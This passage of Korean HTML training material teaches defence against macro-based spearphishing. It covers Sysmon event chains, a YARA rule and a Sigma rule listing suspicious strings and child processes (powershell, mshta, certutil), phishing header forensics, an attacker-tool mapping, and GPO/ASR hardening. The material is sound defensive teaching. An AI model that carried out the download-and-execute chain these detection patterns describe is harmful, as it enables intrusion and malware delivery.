+  └→ <span style="color:#60a5fa">Event ID 1</span>  powershell.exe -enc base64... (ParentImage: cmd.exe)
+
+[페이로드 다운로드]
+  └→ <span style="color:#60a5fa">Event ID 3</span>  powershell.exe → 외부 IP:443 연결
+  └→ <span style="color:#60a5fa">Event ID 11</span> C:\Users\*\AppData\Local\Temp\payload.exe 파일 생성
+
+[페이로드 실행 → C2 통신]
+  └→ <span style="color:#60a5fa">Event ID 1</span>  payload.exe 실행 (ParentImage: powershell.exe)
+  └→ <span style="color:#60a5fa">Event ID 3</span>  payload.exe → C2서버:8443 연결</pre>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">Sysmon 설치 및 구성</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F"># Sysmon 설치 (SwiftOnSecurity 구성 파일 사용)</span>
+sysmon64.exe -accepteula -i sysmonconfig-export.xml
+
+<span style="color:#F4D06F"># 이벤트 로그 조회 (PowerShell)</span>
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
+    Where-Object { $_.Id -eq 1 } |
+    Where-Object { $_.Message -match "WINWORD.EXE" -and $_.Message -match "cmd.exe" } |
+    Format-List TimeCreated, Message</pre>
+                </div>
+
+                <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-xl border border-amber-200 dark:border-amber-700 text-sm">
+                    <p class="font-bold text-amber-700 dark:text-amber-300">💡 핵심 포인트</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">가장 중요한 탐지 포인트는 <span class="hl-blue">Event ID 1에서 WINWORD.EXE가 cmd.exe 또는 powershell.exe의 부모 프로세스인 경우</span>입니다. 정상적인 Word 사용에서는 이런 프로세스 체인이 발생하지 않습니다.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Ch.5 YARA 규칙으로 피싱 탐지 ===================== -->
+        <section id="ch5" data-chapter-id="ch5" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-blue-600 text-white flex items-center justify-center font-black text-sm shadow">05</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">YARA 규칙으로 피싱 탐지</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-blue-50 dark:bg-blue-900/30 p-4 rounded-xl border border-blue-200 dark:border-blue-700">
+                    <p class="text-sm font-bold text-blue-700 dark:text-blue-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">YARA 규칙의 구조를 이해하고, 스피어피싱 첨부파일(매크로 문서)을 탐지하는 기본 규칙을 작성합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">YARA란?</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">YARA는 <span class="hl-teal">패턴 매칭</span> 기반의 악성코드 분류 도구입니다. 파일 내 문자열, 바이트 패턴, 파일 크기, 구조적 특징을 조합하여 탐지 규칙을 작성합니다. SOC, 악성코드 분석가, 위협 인텔리전스 팀에서 광범위하게 사용됩니다.</p>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">YARA 규칙 기본 구조</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F">// 스피어피싱 매크로 문서 탐지 규칙</span>
+rule Spearphish_Macro_Document {
+    meta:
+        description = "VBA 매크로가 포함된 의심 문서 탐지"
+        author      = "ROOT14 SOC Team"
+        severity    = "high"
+        mitre_att   = "T1566.001"
+
+    strings:
+        <span style="color:#9DD9D2">// OLE2 문서 매직 바이트 (Word/Excel)</span>
+        $ole2_magic = { D0 CF 11 E0 A1 B1 1A E1 }
+
+        <span style="color:#9DD9D2">// VBA 프로젝트 스트림 식별자</span>
+        $vba_project = "VBA" ascii wide
+        $vba_dir     = "_VBA_PROJECT" ascii
+
+        <span style="color:#9DD9D2">// 의심 VBA 키워드</span>
+        $auto_open   = "AutoOpen" ascii nocase
+        $auto_close  = "Auto_Close" ascii nocase
+        $shell_exec  = "Shell" ascii nocase
+        $wscript     = "WScript.Shell" ascii nocase
+        $powershell  = "powershell" ascii nocase
+
+    condition:
+        $ole2_magic at 0
+        and $vba_project
+        and any of ($auto_open, $auto_close)
+        and any of ($shell_exec, $wscript, $powershell)
+}</pre>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">YARA 실행 및 결과 해석</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F"># 단일 파일 스캔</span>
+$ yara spearphish_rule.yar suspicious_invoice.docm
+Spearphish_Macro_Document suspicious_invoice.docm
+
+<span style="color:#F4D06F"># 디렉토리 전체 재귀 스캔</span>
+$ yara -r spearphish_rule.yar /quarantine/emails/
+
+<span style="color:#F4D06F"># 매칭 문자열 상세 출력</span>
+$ yara -s spearphish_rule.yar suspicious_invoice.docm
+Spearphish_Macro_Document suspicious_invoice.docm
+0x0:$ole2_magic: D0 CF 11 E0 A1 B1 1A E1
+0x1a2b:$auto_open: AutoOpen
+0x1c4f:$shell_exec: Shell
+0x2031:$powershell: powershell</pre>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">YARA 규칙 핵심 키워드</h3>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs">
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg"><p class="font-bold text-blue-600 dark:text-blue-400">meta:</p><p class="text-slate-500 dark:text-slate-400">규칙 메타데이터 (설명, 작성자, 심각도)</p></div>
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg"><p class="font-bold text-blue-600 dark:text-blue-400">strings:</p><p class="text-slate-500 dark:text-slate-400">탐지할 문자열/바이트 패턴 정의</p></div>
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg"><p class="font-bold text-blue-600 dark:text-blue-400">condition:</p><p class="text-slate-500 dark:text-slate-400">strings 조합 논리 (and, or, any of)</p></div>
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg"><p class="font-bold text-blue-600 dark:text-blue-400">{ hex bytes }</p><p class="text-slate-500 dark:text-slate-400">16진수 바이트 시퀀스 매칭</p></div>
+                </div>
+
+                <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-xl border border-amber-200 dark:border-amber-700 text-sm">
+                    <p class="font-bold text-amber-700 dark:text-amber-300">💡 실무 팁</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">YARA는 <span class="hl-teal">파일 자체</span>를 분석합니다. 이메일 수신 시 첨부파일을 추출하여 YARA 스캔을 수행하고, Sysmon은 실행 <span class="hl-blue">행위</span>를 로깅합니다. 두 도구는 상호 보완적입니다.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Ch.6 Sigma 규칙 기초 ===================== -->
+        <section id="ch6" data-chapter-id="ch6" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-blue-600 text-white flex items-center justify-center font-black text-sm shadow">06</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">Sigma 규칙 기초</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-blue-50 dark:bg-blue-900/30 p-4 rounded-xl border border-blue-200 dark:border-blue-700">
+                    <p class="text-sm font-bold text-blue-700 dark:text-blue-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">Sigma 규칙의 YAML 구조를 이해하고, 스피어피싱 공격의 프로세스 체인을 탐지하는 기본 Sigma 규칙을 분석합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">Sigma란?</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">Sigma는 <span class="hl-teal">SIEM 독립적인 탐지 규칙 언어</span>입니다. YAML 형식으로 작성하며, 변환기(Sigmac/pySigma)를 통해 Splunk, Elastic, Sentinel 등 어떤 SIEM 플랫폼의 쿼리로도 변환할 수 있습니다. YARA가 "파일"을 탐지한다면, Sigma는 "로그"를 탐지합니다.</p>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">Sigma 규칙 구조</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F"># Sigma 규칙: Office 앱에서 의심 자식 프로세스 생성 탐지</span>
+title: Suspicious Office Child Process - Spearphishing Indicator
+id: e42867ac-1a2b-3c4d-5e6f-789012345678
+status: experimental
+description: >
+    Office 애플리케이션이 cmd.exe, powershell.exe, mshta.exe 등
+    의심스러운 자식 프로세스를 생성하는 패턴을 탐지합니다.
+    스피어피싱 첨부파일의 매크로 실행을 나타낼 수 있습니다.
+
+references:
+    - https://attack.mitre.org/techniques/T1566/001/
+
+author: ROOT14 SOC Team
+date: 2026/03/18
+tags:
+    - attack.initial_access
+    - attack.t1566.001
+    - attack.execution
+    - attack.t1204.002
+
+logsource:
+    category: process_creation
+    product: windows
+
+detection:
+    <span style="color:#9DD9D2">selection_parent:</span>
+        ParentImage|endswith:
+            - '\WINWORD.EXE'
+            - '\EXCEL.EXE'
+            - '\POWERPNT.EXE'
+            - '\OUTLOOK.EXE'
+
+    <span style="color:#9DD9D2">selection_child:</span>
+        Image|endswith:
+            - '\cmd.exe'
+            - '\powershell.exe'
+            - '\pwsh.exe'
+            - '\mshta.exe'
+            - '\wscript.exe'
+            - '\cscript.exe'
+            - '\certutil.exe'
+            - '\regsvr32.exe'
+
+    condition: selection_parent and selection_child
+
+falsepositives:
+    - 정상적인 Office 매크로 자동화 (IT부서 검증 필요)
+    - COM Add-in이 프로세스를 생성하는 경우
+
+level: high</pre>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">YARA vs Sigma 비교</h3>
+                <div class="overflow-x-auto">
+                    <table class="w-full text-xs border-collapse">
+                        <thead><tr class="bg-slate-200 dark:bg-slate-700">
+                            <th class="p-2 text-left font-bold">항목</th>
+                            <th class="p-2 text-left font-bold">YARA</th>
+                            <th class="p-2 text-left font-bold">Sigma</th>
+                        </tr></thead>
+                        <tbody>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2 font-bold">대상</td><td class="p-2">파일 (바이너리, 문서)</td><td class="p-2">로그 (이벤트, 시스로그)</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2 font-bold">형식</td><td class="p-2">자체 문법</td><td class="p-2">YAML</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2 font-bold">타이밍</td><td class="p-2">수신/저장 시점 (정적)</td><td class="p-2">실행 시점 (동적)</td></tr>
+                            <tr><td class="p-2 font-bold">변환</td><td class="p-2">직접 실행</td><td class="p-2">pySigma → Splunk/Elastic/Sentinel</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-xl border border-amber-200 dark:border-amber-700 text-sm">
+                    <p class="font-bold text-amber-700 dark:text-amber-300">💡 핵심 포인트</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">Sigma는 "어떤 로그 패턴이 의심스러운가"를 정의합니다. 위 규칙에서 <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-xs">ParentImage: WINWORD.EXE</code> + <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-xs">Image: cmd.exe</code> 조합이 Ch.4에서 배운 Sysmon Event ID 1 로그와 정확히 매칭됩니다.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Ch.7 이메일 헤더 포렌식 실습 ===================== -->
+        <section id="ch7" data-chapter-id="ch7" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-blue-600 text-white flex items-center justify-center font-black text-sm shadow">07</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">이메일 헤더 포렌식 실습</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-blue-50 dark:bg-blue-900/30 p-4 rounded-xl border border-blue-200 dark:border-blue-700">
+                    <p class="text-sm font-bold text-blue-700 dark:text-blue-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">스피어피싱 이메일의 전체 헤더를 분석하여 발신자 위조, 경유 서버, 인증 실패 등 이상 징후를 식별합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">이메일 헤더 구조</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">이메일 헤더는 <span class="hl-teal">아래에서 위로</span> 읽어야 합니다. 각 MTA(Mail Transfer Agent)가 Received 헤더를 위에 추가하므로, 가장 아래의 Received가 최초 발송 서버입니다.</p>
+
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F">═══ 피싱 이메일 헤더 예제 (이상 징후 포함) ═══</span>
+
+Return-Path: &lt;bounce@attacker-mail.xyz&gt;               <span style="color:#ef4444">← [1] 실제 반송 주소 ≠ From</span>
+Received: from gateway.company.com (mx1.company.com [10.0.0.5])
+    by internal-mx.company.com; Tue, 18 Mar 2026 09:15:33 +0900
+Received: from mail-out.attacker-mail.xyz (unknown [185.234.72.11])
+    by gateway.company.com; Tue, 18 Mar 2026 09:15:31 +0900 <span style="color:#ef4444">← [2] 발신 IP</span>
+Authentication-Results: gateway.company.com;
+    spf=<span style="color:#ef4444">fail</span> (sender IP not authorized)              <span style="color:#ef4444">← [3] SPF 실패</span>
+    dkim=<span style="color:#ef4444">none</span>                                         <span style="color:#ef4444">← [4] DKIM 없음</span>
+    dmarc=<span style="color:#ef4444">fail</span> (policy=none, disposition=none)        <span style="color:#ef4444">← [5] DMARC 실패 (p=none이라 통과)</span>
+From: "김철수 부장" &lt;cskim@company.com&gt;                 <span style="color:#ef4444">← [6] 위조된 발신자</span>
+To: "이영희 대리" &lt;yhlee@company.com&gt;
+Subject: [긴급] Q1 실적 보고서 검토 요청
+Date: Tue, 18 Mar 2026 09:15:28 +0900
+Content-Type: multipart/mixed;
+    boundary="--=_Part_12345"
+X-Mailer: Python/smtplib                              <span style="color:#ef4444">← [7] 의심 메일 클라이언트</span></pre>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">7가지 이상 징후 분석</h3>
+                <div class="space-y-2 text-sm">
+                    <div class="flex gap-2"><span class="shrink-0 text-red-500 font-bold">[1]</span><p class="text-slate-600 dark:text-slate-300"><span class="hl-blue">Return-Path</span>와 From 불일치: 반송 주소가 attacker-mail.xyz인데 From은 company.com</p></div>
+                    <div class="flex gap-2"><span class="shrink-0 text-red-500 font-bold">[2]</span><p class="text-slate-600 dark:text-slate-300"><span class="hl-blue">발신 IP</span> 185.234.72.11이 company.com의 SPF 레코드에 없는 외부 IP</p></div>
+                    <div class="flex gap-2"><span class="shrink-0 text-red-500 font-bold">[3]</span><p class="text-slate-600 dark:text-slate-300"><span class="hl-blue">SPF fail</span>: 해당 IP가 company.com에서 허용한 발신 서버가 아님</p></div>
+                    <div class="flex gap-2"><span class="shrink-0 text-red-500 font-bold">[4]</span><p class="text-slate-600 dark:text-slate-300"><span class="hl-blue">DKIM none</span>: 서명이 아예 없음 → 합법적 메일 서버라면 보통 서명 있음</p></div>
+                    <div class="flex gap-2"><span class="shrink-0 text-red-500 font-bold">[5]</span><p class="text-slate-600 dark:text-slate-300"><span class="hl-blue">DMARC fail</span>이지만 p=none → 정책이 모니터링 전용이라 차단 안 됨</p></div>
+                    <div class="flex gap-2"><span class="shrink-0 text-red-500 font-bold">[6]</span><p class="text-slate-600 dark:text-slate-300"><span class="hl-blue">From 위조</span>: SMTP 프로토콜에서 From 헤더는 자유롭게 설정 가능</p></div>
+                    <div class="flex gap-2"><span class="shrink-0 text-red-500 font-bold">[7]</span><p class="text-slate-600 dark:text-slate-300"><span class="hl-blue">X-Mailer</span>: Python smtplib은 자동화 도구 → 일반 메일 클라이언트가 아님</p></div>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">헤더 분석 도구</h3>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs">
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg"><p class="font-bold text-blue-600 dark:text-blue-400">MXToolBox Header Analyzer</p><p class="text-slate-500 dark:text-slate-400">웹 기반 헤더 분석, 경유 서버 시각화</p></div>
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg"><p class="font-bold text-blue-600 dark:text-blue-400">Google Admin Toolbox</p><p class="text-slate-500 dark:text-slate-400">이메일 헤더 파싱 + 인증 결과 요약</p></div>
+                </div>
+
+                <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-xl border border-amber-200 dark:border-amber-700 text-sm">
+                    <p class="font-bold text-amber-700 dark:text-amber-300">⚠️ 실무 중요</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">이 예제에서 DMARC이 <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-xs">p=none</code>이라 피싱이 통과했습니다. Ch.2에서 배운 것처럼 <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-xs">p=reject</code>로 변경하면 이 공격이 Layer 1에서 차단됩니다.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Ch.8 관점 전환: 공격자 → 방어자 ===================== -->
+        <section id="ch8" data-chapter-id="ch8" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-blue-600 text-white flex items-center justify-center font-black text-sm shadow">08</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">공격자 → 방어자 관점 전환</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-blue-50 dark:bg-blue-900/30 p-4 rounded-xl border border-blue-200 dark:border-blue-700">
+                    <p class="text-sm font-bold text-blue-700 dark:text-blue-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">초급에서 배운 공격 기법을 방어자 시점으로 재분석하고, 각 공격 단계별 탐지·차단 전략을 설계합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">공격 체인 vs 방어 체인 매핑</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">초급에서 배운 공격 7단계를 방어자 관점에서 1:1 매핑합니다. 공격의 각 단계마다 <span class="hl-teal">탐지(Detect)</span>, <span class="hl-yel">차단(Block)</span>, <span class="hl-blue">대응(Respond)</span> 기회가 존재합니다.</p>
+
+                <div class="overflow-x-auto">
+                    <table class="w-full text-xs border-collapse">
+                        <thead><tr class="bg-slate-200 dark:bg-slate-700">
+                            <th class="p-2 text-left font-bold">공격 단계 (초급)</th>
+                            <th class="p-2 text-left font-bold">공격자 도구</th>
+                            <th class="p-2 text-left font-bold">방어 대응 (중급)</th>
+                            <th class="p-2 text-left font-bold">탐지 도구</th>
+                        </tr></thead>
+                        <tbody>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">① 정찰·목표 선정</td><td class="p-2">OSINT</td><td class="p-2">임직원 노출 정보 관리</td><td class="p-2">-</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">② 피싱 메일 발송</td><td class="p-2">GoPhish, SET</td><td class="p-2">SPF/DKIM/DMARC + SEG</td><td class="p-2">이메일 게이트웨이</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">③ 사용자 파일 오픈</td><td class="p-2">사회공학</td><td class="p-2">보안 인식 교육</td><td class="p-2">피싱 신고 버튼</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">④ 매크로 실행</td><td class="p-2">VBA AutoOpen</td><td class="p-2">ASR Rule + 매크로 차단</td><td class="p-2">Defender 이벤트</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">⑤ PowerShell 다운로더</td><td class="p-2">msfvenom</td><td class="p-2">AMSI + Constrained Language</td><td class="p-2">Sysmon ID 1</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">⑥ 페이로드 실행</td><td class="p-2">Meterpreter</td><td class="p-2">EDR 행위 분석</td><td class="p-2">Sysmon ID 1,7,11</td></tr>
+                            <tr><td class="p-2">⑦ C2 통신</td><td class="p-2">Reverse Shell</td><td class="p-2">DNS 싱크홀 + NDR</td><td class="p-2">Sysmon ID 3, NDR</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">MITRE ATT&CK Detection Coverage</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300"><span class="hl-blue">Detection Coverage</span>란 ATT&CK 매트릭스의 기법 중 몇 개에 대해 탐지 규칙이 존재하는지를 나타내는 지표입니다. SOC 성숙도를 측정하는 핵심 KPI로 사용됩니다.</p>
+
+                <div class="bg-slate-100 dark:bg-slate-800 p-4 rounded-xl text-xs space-y-2">
+                    <p class="font-bold text-slate-700 dark:text-slate-200">T1566.001에 대한 탐지 커버리지 예시:</p>
+                    <div class="space-y-1">
+                        <div class="flex items-center gap-2"><span class="w-3 h-3 bg-green-500 rounded-sm shrink-0"></span><span>이메일 게이트웨이: SPF/DKIM/DMARC 검증 ✅</span></div>
+                        <div class="flex items-center gap-2"><span class="w-3 h-3 bg-green-500 rounded-sm shrink-0"></span><span>ASR: Office 자식 프로세스 차단 ✅</span></div>
+                        <div class="flex items-center gap-2"><span class="w-3 h-3 bg-green-500 rounded-sm shrink-0"></span><span>Sysmon + Sigma: 프로세스 체인 탐지 ✅</span></div>
+                        <div class="flex items-center gap-2"><span class="w-3 h-3 bg-green-500 rounded-sm shrink-0"></span><span>YARA: 매크로 문서 정적 분석 ✅</span></div>
+                        <div class="flex items-center gap-2"><span class="w-3 h-3 bg-yellow-500 rounded-sm shrink-0"></span><span>NDR: C2 트래픽 탐지 ⚠️ (암호화 채널 시 제한적)</span></div>
+                    </div>
+                </div>
+
+                <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-xl border border-amber-200 dark:border-amber-700 text-sm">
+                    <p class="font-bold text-amber-700 dark:text-amber-300">💡 핵심 포인트</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">공격자가 <span class="hl-teal">하나의 기법</span>을 사용하더라도, 방어자는 <span class="hl-blue">여러 계층</span>에서 탐지 기회를 확보해야 합니다. 어느 한 계층이 실패해도 다른 계층이 잡아낼 수 있도록 설계하는 것이 Defense in Depth의 핵심입니다.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Ch.9 GPO/ASR/게이트웨이 방어 설정 ===================== -->
+        <section id="ch9" data-chapter-id="ch9" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-blue-600 text-white flex items-center justify-center font-black text-sm shadow">09</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">GPO/ASR/게이트웨이 방어 설정</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-blue-50 dark:bg-blue-900/30 p-4 rounded-xl border border-blue-200 dark:border-blue-700">
+                    <p class="text-sm font-bold text-blue-700 dark:text-blue-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">조직 환경에서 스피어피싱을 방어하기 위한 GPO(그룹 정책), ASR 규칙, 이메일 게이트웨이 설정을 구체적으로 학습합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">1. GPO: Office 매크로 비활성화</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">가장 확실한 방어는 <span class="hl-yel">인터넷에서 다운로드한 Office 파일의 매크로를 전면 차단</span>하는 것입니다. Windows는 인터넷에서 다운로드한 파일에 Zone.Identifier (Mark of the Web) 태그를 추가하므로, 이를 기반으로 매크로를 선택적으로 차단할 수 있습니다.</p>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F"># GPO 경로: 사용자 구성 → 관리 템플릿 → Microsoft Word → 보안</span>
+# "인터넷에서 가져온 Office 파일에서 매크로 실행 차단"
+
+Registry Key:  HKCU\Software\Policies\Microsoft\Office\16.0\Word\Security
+Value Name:    blockcontentexecutionfrominternet
+Value:         1 (Enabled)
+
+<span style="color:#F4D06F"># PowerShell로 일괄 적용 (Word + Excel + PowerPoint)</span>
+$apps = @('Word','Excel','PowerPoint')
+foreach ($app in $apps) {
+    $path = "HKCU:\Software\Policies\Microsoft\Office\16.0\$app\Security"
+    New-Item -Path $path -Force | Out-Null
+    Set-ItemProperty -Path $path -Name "blockcontentexecutionfrominternet" -Value 1
+}</pre>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">2. ASR 규칙 전체 활성화</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F"># 피싱 방어용 ASR 규칙 4종 Block 모드 일괄 활성화</span>
+$rules = @(
+    "D4F940AB-401B-4EFC-AADC-AD5F3C50688A",  <span style="color:#9DD9D2"># Office 자식 프로세스 차단</span>
+    "3B576869-A4EC-4529-8536-B80A7769E899",  <span style="color:#9DD9D2"># 실행 콘텐츠 생성 차단</span>
+    "92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B",  <span style="color:#9DD9D2"># Win32 API 호출 차단</span>
+    "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC"   <span style="color:#9DD9D2"># 난독화 스크립트 차단</span>
+)
+$actions = @("Enabled","Enabled","Enabled","Enabled")
+
+Set-MpPreference `
+    -AttackSurfaceReductionRules_Ids $rules `
+    -AttackSurfaceReductionRules_Actions $actions
+
+<span style="color:#F4D06F"># 적용 확인</span>
+Get-MpPreference | Select-Object `
+    AttackSurfaceReductionRules_Ids,
+    AttackSurfaceReductionRules_Actions</pre>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">3. 이메일 게이트웨이 첨부파일 정책</h3>
+                <div class="space-y-2 text-sm text-slate-600 dark:text-slate-300">
+                    <p>• <span class="hl-teal">차단 확장자</span>: .exe, .scr, .bat, .cmd, .vbs, .js, .wsf, .hta, .ps1</p>
+                    <p>• <span class="hl-teal">경고 확장자</span>: .docm, .xlsm, .pptm (매크로 포함 문서)</p>
+                    <p>• <span class="hl-teal">샌드박스 대상</span>: .doc, .docx, .xls, .xlsx, .pdf, .zip, .rar</p>
+                    <p>• <span class="hl-teal">URL 재작성</span>: 본문 내 URL을 Safe Links로 래핑하여 클릭 시 검사</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">4. PowerShell Constrained Language Mode</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F"># Constrained Language Mode 활성화 (GPO 또는 AppLocker)</span>
+# 제한 모드에서는 .NET 직접 호출, COM 객체, Add-Type 등이 차단됨
+
+<span style="color:#F4D06F"># 현재 모드 확인</span>
+$ExecutionContext.SessionState.LanguageMode
+<span style="color:#9DD9D2"># 결과: ConstrainedLanguage (제한 모드) 또는 FullLanguage (전체 모드)</span>
+
+<span style="color:#F4D06F"># 제한 모드에서 차단되는 예시</span>
+PS> [System.Net.WebClient]::new().DownloadFile(...)
+<span style="color:#ef4444">ERROR: Cannot create type. Only core types are supported in this language mode.</span></pre>
+                </div>
+
+                <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-xl border border-amber-200 dark:border-amber-700 text-sm">
+                    <p class="font-bold text-amber-700 dark:text-amber-300">💡 배포 순서 권장</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">① DMARC p=reject → ② ASR Audit 모드(1주 모니터링) → ③ ASR Block 모드 전환 → ④ GPO 매크로 차단 → ⑤ Constrained Language Mode. 단계별로 적용하고 오탐(False Positive)을 확인한 후 다음 단계로 진행합니다.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Quiz: 탐지 규칙 종합 퀴즈 ===================== -->
+        <section id="quiz" data-chapter-id="quiz" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-amber-500 text-white flex items-center justify-center font-black text-sm shadow">📝</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">탐지 규칙 종합 퀴즈</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-8">
+                <p class="text-sm text-slate-600 dark:text-slate-300">Ch.1~Ch.9에서 배운 내용을 종합적으로 평가합니다. 5문항 중 4문항 이상 정답 시 통과입니다.</p>
+
+                <!-- Q1 -->
+                <div class="space-y-3">
